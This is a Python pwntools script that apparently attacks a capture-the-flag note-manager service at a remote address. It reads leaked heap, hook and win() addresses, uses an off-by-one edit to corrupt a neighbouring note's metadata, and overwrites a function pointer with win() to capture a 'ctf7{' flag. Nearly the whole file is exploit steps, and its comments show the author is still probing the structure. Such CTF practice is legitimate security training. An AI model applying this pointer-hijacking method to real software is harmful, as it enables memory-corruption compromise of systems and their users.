#!/usr/bin/env python3
"""
Analyze note structure to find where hook pointer might be
"""
from pwn import *

io = remote('212.2.250.33', 32384)

banner = io.recvuntil(b'>')
import re
heap = int(re.search(rb'heap\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
win = int(re.search(rb'win\(\)\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)
hook = int(re.search(rb'hook\s+@\s+0x([0-9a-fA-F]+)', banner).group(1), 16)

log.success(f"heap:  0x{heap:x}")
log.success(f"win(): 0x{win:x}")
log.success(f"hook:  0x{hook:x}")

# The hook at 0x404260 is likely a global function pointer in .bss
# Each note might have a pointer to this hook

# Let's create a note and see its structure
print("\n[1] Create note 0")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'8')  # Small size
io.recvuntil(b':')
io.sendline(b'AAAAAAAA')
response = io.recvuntil(b'>')
print(response.decode())

# Note structure might be:
# - size field
# - data pointer
# - hook pointer?
# - actual data

# Let's try to leak memory by printing
print("\n[2] Print note 0")
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'0')
response = io.recvuntil(b'>')
print("Print output:")
print(response)

# Let's create another note and see the pattern
print("\n[3] Create note 1")
io.sendline(b'1')
io.recvuntil(b':')
io.sendline(b'8')
io.recvuntil(b':')
io.sendline(b'BBBBBBBB')
response = io.recvuntil(b'>')
print(response.decode())

# Now let's try the off-by-one to corrupt note 1's metadata
print("\n[4] Edit note 0 - append to trigger off-by-one")
io.sendline(b'2')
io.recvuntil(b':')
io.sendline(b'0')
io.recvuntil(b':')
# Append 1 byte
io.sendline(b'C')
response = io.recvuntil(b'>')
print(response.decode())

# Print note 0 to see the overflow
print("\n[5] Print note 0 after edit")
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'0')
response = io.recvuntil(b'>')
print("After edit:")
print(response)

# Now edit again with win() address
print("\n[6] Edit note 0 again - write win() address")
io.sendline(b'2')
io.recvuntil(b':')
io.sendline(b'0')
io.recvuntil(b':')
# Append win() address
io.sendline(p64(win))
response = io.recvuntil(b'>', timeout=2)
print(response.decode(errors='ignore'))

# Try to trigger by printing note 1
print("\n[7] Print note 1 (might call corrupted hook)")
io.sendline(b'4')
io.recvuntil(b':')
io.sendline(b'1')

output = io.recvall(timeout=3)
result = output.decode(errors='ignore')

print("\n" + "="*60)
print(result)
print("="*60)

if 'ctf7{' in result:
    flag = re.search(r'ctf7\{[^}]+\}', result)
    if flag:
        log.success(f"FLAG: {flag.group(0)}")

io.close()
